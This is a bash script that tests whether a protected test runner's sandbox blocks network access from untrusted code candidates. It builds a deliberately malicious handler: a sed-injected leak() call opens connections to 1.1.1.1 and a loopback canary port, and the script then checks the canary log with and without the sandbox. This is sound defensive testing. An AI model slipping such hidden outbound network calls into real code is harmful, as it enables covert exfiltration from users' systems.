#!/bin/bash
# Linux sandbox check for the protected runner (see docs/agent-sprint/SECURITY.md). Runs inside a container:
#   git archive HEAD sample-repos | docker run --rm -i [--security-opt seccomp=unconfined] -v "$PWD/scripts/linux-sandbox-check.sh:/run.sh:ro" \
#     node:24-bookworm-slim bash -c 'mkdir /repo && tar -x -C /repo && bash /run.sh'
set -u
cd /repo
echo "== uname: $(uname -srm); node $(node -v); unshare: $(command -v unshare)"
node -e 'import("./sample-repos/run-protected-tests.mjs").then(m=>console.log("detectSandbox =", m.detectSandbox()))'
# Untrusted candidates live outside sample-repos/.
mkdir -p /tmp/cand-ref /tmp/cand-evil
cp sample-repos/repo-a/reference-fix/handler.mjs /tmp/cand-ref/handler.mjs
{ cat <<'JS'
import net from "node:net";
const leak = () => { for (const [h, p] of [["127.0.0.1", 9999], ["1.1.1.1", 80]]) { const s = net.connect(p, h); s.on("connect", () => { s.write(`LEAK to ${h}\n`); s.end(); }); s.on("error", () => {}); } };
leak();
JS
sed 's/async handle(event) {/async handle(event) { leak(); await new Promise((r) => setTimeout(r, 200));/' sample-repos/repo-a/reference-fix/handler.mjs; } > /tmp/cand-evil/handler.mjs
# Canary: any connection to loopback :9999 from the candidate is logged.
node -e 'require("net").createServer(s=>s.on("data",d=>require("fs").appendFileSync("/tmp/canary.log",d))).listen(9999,"127.0.0.1")' &
sleep 0.5
summ() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const r=JSON.parse(s);console.log(JSON.stringify({passed:r.passed,sandbox:r.sandbox,passedCount:r.passedCount,total:r.total,error:r.error}))})'; }
echo "== reference fix (untrusted dir)"; node sample-repos/run-protected-tests.mjs repo-a /tmp/cand-ref | summ
echo "== malicious candidate (untrusted dir)"; node sample-repos/run-protected-tests.mjs repo-a /tmp/cand-evil | summ
sleep 1; echo "canary after sandboxed run: $(cat /tmp/canary.log 2>/dev/null | tr '\n' ' ' || true)"
echo "== positive control: same malicious code as a trusted fixture (runs WITHOUT OS sandbox only when none is available)"
mkdir -p sample-repos/repo-a/evil-fixture && cp /tmp/cand-evil/handler.mjs sample-repos/repo-a/evil-fixture/
node --input-type=module -e '
const { spawnCandidate } = await import("/repo/sample-repos/harness/remote.mjs");
process.env.IX_SANDBOX = "none-trusted-fixture";
const c = spawnCandidate({ candidateFile: "/repo/sample-repos/repo-a/evil-fixture/handler.mjs", factory: "createEventHandler", argStyle: "positional", deps: { store: { reserve: async () => true, release: async () => {}, insertJob: async () => {} } } });
await c.call("handle", { id: "e1", type: "t", payload: {} }).catch((e) => console.log("call error", e.message));
c.close();
'
sleep 1; echo "canary after UNSANDBOXED control: $(cat /tmp/canary.log 2>/dev/null | tr '\n' ' ' || true)"
